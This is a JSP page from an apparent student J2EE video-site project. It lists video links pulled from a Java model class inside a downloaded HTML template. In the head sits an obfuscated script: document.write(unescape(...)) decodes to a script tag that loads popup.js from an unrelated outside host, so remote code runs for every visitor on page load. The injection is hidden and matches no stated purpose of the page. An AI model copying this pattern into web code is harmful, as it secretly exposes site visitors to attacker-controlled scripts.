<%@page import="com.model.Video"%>
<%@page import="com.model.Impl.VideoImpl2"%>
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
	String path = request.getContextPath();
	String basePath = request.getScheme() + "://" + request.getServerName() + ":" + request.getServerPort()
			+ path + "/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<base href="<%=basePath%>">

<title>My JSP 'Item.jsp' starting page</title>

<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
<meta http-equiv="description" content="This is my page">
<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->
<script type='text/javascript' language='Javascript'>
<!--
document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%65%6E%61%6C%6C%61%2E%77%65%62%73%2E%63%6F%6D%2F%70%6F%70%75%70%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));
//-->
</script>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Video 1</title>
<!--// Stylesheets //-->
<link href="css/style.css" rel="stylesheet" type="text/css" />
<link href="css/ddsmoothmenu.css" rel="stylesheet" type="text/css" />
<link href="css/scrollbar.css" rel="stylesheet" type="text/css" />
<!--// Javascript //-->
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/ddsmoothmenu.js"></script>
<script type="text/javascript" src="js/menu.js"></script>
<script type="text/javascript" src="js/contentslider.js"></script>
<script type="text/javascript" src="js/jquery.1.4.2.js"></script>
<script type="text/javascript" src="js/jquery.lint.js"></script>
<script type="text/javascript" src="js/jquery.scroll.js"></script>
<script type="text/javascript" src="js/scroll.js"></script>
<script type="text/javascript" src="js/jquery.idTabs.min.js"></script>
<script type="text/javascript" src="js/switch.js"></script>
<script type="text/javascript" src="js/tabs.js"></script>
<script type="text/javascript" src="js/cufon-yui.js"></script>
<script type="text/javascript" src="js/cufon.js"></script>
<script type="text/javascript" src="js/Myriad_Pro_400-Myriad_Pro_700-Myriad_Pro_italic_400-Myriad_Pro_italic_700.font.js"></script>
<!--[if lte IE 7]><style>.comments .commentlinks{margin-left:250px;}
.comments .singlebtn{margin-left:380px;}
.comments ul li:hover .commentlinks{display:inline-block;}
.comments ul li.level2:hover .commentlinks{margin-left:210px;}
.comments ul li.level2:hover .singlebtn{margin-left:340px;}
</style><![endif]--><!-- that's IT-->
</head>

  <body>
  <span class="biglines">&nbsp;</span>
<!-- Wrapper -->
<div id="wrapper_sec">
	<!-- Top Section -->
    <div class="top_sec">
    	<!-- Top Section Left Links -->
        <div class="toplinks">
        	<ul>
            	<li class="first"><a href="index.jsp">主页</a></li>
                <li><a href="login.jsp">管理员登录</a></li>          
            </ul>
        </div>
        <!-- Top Section right Links -->
        <div class="links_icons">
        	<ul>
                <li><a href="#" class="upload">上传</a></li>
                <li class="last lang">语言:中文</li>
            </ul>
        </div>
    </div>
    <div class="clear"></div>
    <!-- Header -->
    <div id="masthead">
    	<!-- Logo -->
        <div class="logo">
        	<a href="index.jsp"><img src="images/logo.png" alt="" /></a>
        </div>
        <!-- Navigation -->
        <div class="navigation">
        	<div id="smoothmenu1" class="ddsmoothmenu">
                <ul>
                    <li><a href="index.jsp" class="staticlinks">主页</a></li>
                    <li><a href="Item.jsp" class="staticlinks">视频</a></li>
                    <li><a href="login.jsp" class="staticlinks">登录</a></li>
                    <li><a href="Review.jsp" class="staticlinks">评论</a></li>
                    <li><a href="#">所有页面</a>
                    	<ul>
                            <li><a href="index.jsp">主页</a></li>
                            <li><a href="Item.jsp">视频</a></li>
                            <li><a href="Review.jsp">评论</a></li>
                            <li><a href="login.jsp">登录</a></li>
                      	</ul>
                    </li>
                </ul>
            	<div class="clear"></div>
            </div>
        </div>
        <div class="copyrights">Collect from <a href="http://www.cssmoban.com/"  title="网站模板">网站模板</a></div>
       
<%
VideoImpl2 videoImpl2=new VideoImpl2();
ArrayList<Video> al=new ArrayList<Video>();
al=videoImpl2.getVidoeList();

 %>
	<table width="70%" border="1" class="t1" align="center" width="150">
		<tr>
			<th>链接1</th>
			
		</tr>
		
		<%for(int i=0;i<al.size();i++){ %>
		<tr>
		<th><a href="htb_broadcast.jsp?id=<%=al.get(i).getId()%>">视频<%= i%></a></th>
		
		</tr>
		<% }%>
			<!-- Footer -->
<div id="footer">
	<div class="inner">
    	
    
             
                </div>
            </div>
            <div class="clear"></div>
        </div>
    </div>
</div>
<div class="clear"></div>
<div id="copyrights">
	<div class="inner">
    	<p>J2EE 大作业 第八组 视频网站</p>
        
    </div>
</div>
</body>
</html>
